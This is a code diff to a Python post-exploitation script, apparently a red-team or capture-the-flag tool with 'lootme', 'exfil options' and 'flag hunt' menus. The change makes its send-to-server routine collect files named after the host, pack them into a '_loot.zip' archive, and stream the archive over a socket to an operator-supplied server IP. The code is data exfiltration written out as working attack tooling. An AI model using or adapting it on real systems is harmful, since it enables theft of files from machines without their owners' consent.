@@ -1,5 +1,5 @@
 import re, sys, os, platform
-import ipaddress, socket
+import ipaddress, socket, zipfile
 from subprocess import Popen, PIPE
 
 #
@@ -27,7 +27,7 @@ def mainmenu():
             elif mitem == 1:    # lootme
                 outfiles = lootme_stub(outfiles)
             elif mitem == 2:    # exfil options
-                exfil_options(outfiles)
+                outfiles = exfil_options(outfiles)
             elif mitem == 3:    # compression/ encryption options
                 print(3)
             elif mitem == 4:    # flag hunt
@@ -186,10 +186,35 @@ def send2srvr(outfiles):
     sock = socket.socket()
     print('\nEnter server IP')
     host = str(raw_input())
+
+    files = os.listdir('./')
+    for f in files:
+        regex_query = '^'+platform.uname()[1]+'_[.]*'
+        if re.search(regex_query, f) and f not in outfiles:
+            outfiles.append(f)
+            print('Adding '+f+' to outfiles.')
+
+    lootzip = (platform.uname()[1]+'_loot.zip')
+    try:
+        with zipfile.ZipFile(lootzip, 'w') as lzip:
+            for i in outfiles:
+                if i is not None:
+                    lzip.write(i)
+            lzip.close()
+    except:
+        print('Zip write error')
+        for e in sys.exc_info():
+            print(e)
+
     if re.match('\d{1,5}', str(port)):
         try:
             sock.connect((host, port))
-            with open((platform.uname()[1]+'_loot.txt'), 'r') as sendfile:
+            sock.send(lootzip)
+            sock.close()
+            
+            sock = socket.socket()
+            sock.connect((host, port))
+            with open(lootzip, 'r') as sendfile:
                 l = sendfile.read(1024)
                 while(l):
                     print('Sending...')
@@ -202,7 +227,7 @@ def send2srvr(outfiles):
             print('Something bad happened.\n')
             for i in sys.exc_info():
                 print(i)
-        print('Error in port number.')
+    return outfiles
 ### send to server --end--
 
 ### flag hunt --start--
